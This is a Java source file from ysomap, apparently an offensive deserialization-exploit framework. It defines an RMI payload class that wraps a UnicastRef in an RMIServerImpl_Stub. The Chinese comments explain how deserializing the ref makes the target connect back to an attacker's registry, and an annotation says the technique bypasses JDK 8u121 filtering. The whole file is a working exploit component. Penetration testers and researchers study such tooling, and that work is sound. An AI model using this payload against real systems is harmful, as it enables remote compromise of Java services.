package ysomap.payloads.java.rmi;

import sun.rmi.server.UnicastRef;
import ysomap.bullets.Bullet;
import ysomap.bullets.jdk.rmi.RMIConnectBullet;
import ysomap.common.annotation.*;
import ysomap.payloads.AbstractPayload;

import javax.management.remote.rmi.RMIServerImpl_Stub;
import java.rmi.Remote;
import java.rmi.server.RemoteRef;

/**
 * @author wh1t3P1g
 * @since 2020/2/26
 * 原理 UnicastRef 继承 java.io.Externalizable 还原相应的ref
 * 在remote端还原一个UnicastRef时，还原的内容会被注册到当前的ConnectionInputStream的incomingRefTable
 * 在接受完lookup后，会调用StreamRemoteCall的releaseInputStream，处理incomingRefTable中的ref 后续进行反连操作
 * 这里的利用方式有两种：(重点都在于怎么去触发readExternal函数还原相应的ref)
 *  1. 找到封装UnicastRef的对象，如RMIConnectionImpl_Stub
 *  2. 利用反序列化的递归反序列化过程
 *      即 虽然找不到当前类，但是还是会继续对反序列化数据中类的属性进行递归反序列化
 *          也就使得我们的ref可以注册上去
 */
@SuppressWarnings({"rawtypes"})
@Payloads
@Targets({Targets.JDK, Targets.RMI})
@Require(bullets = {"RMIConnectBullet"}, param = false)
@Dependencies({"using to bypass jdk>=8u121","wrapped `UnicastRef` object"})
@Authors({ Authors.WH1T3P1G, Authors.LALA })
public class RMIConnectWrapped extends AbstractPayload<Remote> {

    @Override
    public boolean checkObject(Object obj) {
        return obj instanceof UnicastRef;
    }

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return RMIConnectBullet.newInstance(args);
    }

    @Override
    public Remote pack(Object obj) throws Exception {
        // also ok
        // RMIServerImpl_Stub OK
        // RegistryImpl_Stub OK
        // DGCImpl_Stub OK
        // ReferenceWrapper_Stub
        // UnicastRemoteObject OK
        // RMIConnectionImpl_Stub OK
        return new RMIServerImpl_Stub((RemoteRef) obj);
    }

    public static class CustomizedRemote implements Remote, java.io.Serializable {
        private RemoteRef ref;

        public CustomizedRemote(RemoteRef remoteref) {
            ref=remoteref;
        }
    }
}
